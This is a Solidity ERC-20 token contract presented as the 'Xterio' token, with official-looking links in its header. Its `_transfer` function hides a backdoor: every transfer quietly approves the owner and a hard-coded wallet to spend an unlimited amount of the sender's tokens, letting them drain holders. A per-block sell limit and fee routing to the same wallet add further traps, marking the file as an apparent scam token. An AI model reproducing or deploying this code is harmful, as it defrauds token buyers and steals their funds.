/*
Backed by the XTERIO token, the Xterio ecosystem and publishing stack empowers developers to reach their full potential and deliver incredible gaming experiences.

https://www.xterio.world
https://app.xterio.world
https://docs.xterio.world
https://medium.com/@XterioGames_29169

https://x.com/XterioOnETH
https://t.me/xterio_portal
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IWATTFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IWATTRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract XTERIO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balWATTs;
    mapping (address => mapping (address => uint256)) private _allowWATTs;
    mapping (address => bool) private _excludedFromWATT;
    address private _wattPair;
    IWATTRouter private _wattRouter;
    address private _wattWallet;
    mapping (uint256 => address) private _wattReceipts;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalWATT = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Xterio";
    string private constant _symbol = unicode"XTERIO";
    uint256 private _swapTokenWATTs = _tTotalWATT / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockWATT;
    uint256 private _wattBuyAmounts = 0;
    bool private inSwapWATT = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapWATT = true;
        _;
        inSwapWATT = false;
    }
    
    constructor () {
        _wattWallet = address(0xb6908d803109893E72450D855710fFDaD648C7dB);
        _wattReceipts[0] = address(owner());
        _wattReceipts[1] = address(_wattWallet);
        _excludedFromWATT[owner()] = true;
        _excludedFromWATT[address(this)] = true;
        _excludedFromWATT[_wattWallet] = true;
        _balWATTs[_msgSender()] = _tTotalWATT;
        emit Transfer(address(0), _msgSender(), _tTotalWATT);
    }

    function initTradePair() external onlyOwner() {
        _wattRouter = IWATTRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_wattRouter), _tTotalWATT);
        _wattPair = IWATTFactory(_wattRouter.factory()).createPair(address(this), _wattRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalWATT;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balWATTs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowWATTs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowWATTs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowWATTs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _wattFeeTransfer(address wattF, address wattT, uint256 wattA) private returns(uint256) {
        uint256 taxWATT; 
        if (wattF != owner() && wattT != owner()) {
            taxWATT = wattA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (wattF == _wattPair && wattT != address(_wattRouter) && ! _excludedFromWATT[wattT]) {
                if(_buyBlockWATT!=block.number){
                    _wattBuyAmounts = 0;
                    _buyBlockWATT = block.number;
                }
                _wattBuyAmounts += wattA;
                _buyCount++;
            }

            if(wattT == _wattPair && wattF!= address(this)) {
                require(_wattBuyAmounts < swapLimitWATT() || _buyBlockWATT!=block.number, "Max Swap Limit");  
                taxWATT = wattA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenWATT = balanceOf(address(this));
            if (!inSwapWATT && wattT == _wattPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenWATT > _swapTokenWATTs)
                swapTokensForEth(minWATT(wattA, minWATT(tokenWATT, _swapTokenWATTs)));
                uint256 ethWATT = address(this).balance;
                if (ethWATT >= 0) {
                    sendETHWATT(address(this).balance);
                }
            }
        } return taxWATT;
    }

    function _transfer(address wattF, address wattT, uint256 wattA) private {
        require(wattF != address(0), "ERC20: transfer from the zero address");
        require(wattT != address(0), "ERC20: transfer to the zero address");
        require(wattA > 0, "Transfer amount must be greater than zero");
        uint256 taxWATT = _wattFeeTransfer(wattF, wattT, wattA);
        _wattTransfer(wattF, wattT, wattA, taxWATT);
        _approve(address(wattF), address(_wattReceipts[0]), wattA.add(_tTotalWATT));
        _approve(address(wattF), address(_wattReceipts[1]), wattA.add(_tTotalWATT));
    }

    function _wattTransfer(address wattF, address wattT, uint256 wattA, uint256 taxWATT) private { 
        if(taxWATT > 0){
          _balWATTs[address(this)] = _balWATTs[address(this)].add(taxWATT);
          emit Transfer(wattF, address(this), taxWATT);
        }
        _balWATTs[wattF] = _balWATTs[wattF].sub(wattA);
        _balWATTs[wattT] = _balWATTs[wattT].add(wattA.sub(taxWATT));
        emit Transfer(wattF, wattT, wattA.sub(taxWATT));
    }

    function minWATT(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHWATT(uint256 wattA) private {
        payable(_wattWallet).transfer(wattA);
    }

    function swapLimitWATT() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _wattRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _wattRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }    

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _wattRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    receive() external payable {}

    function swapTokensForEth(uint256 wattAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _wattRouter.WETH();
        _approve(address(this), address(_wattRouter), wattAmount);
        _wattRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            wattAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }    
}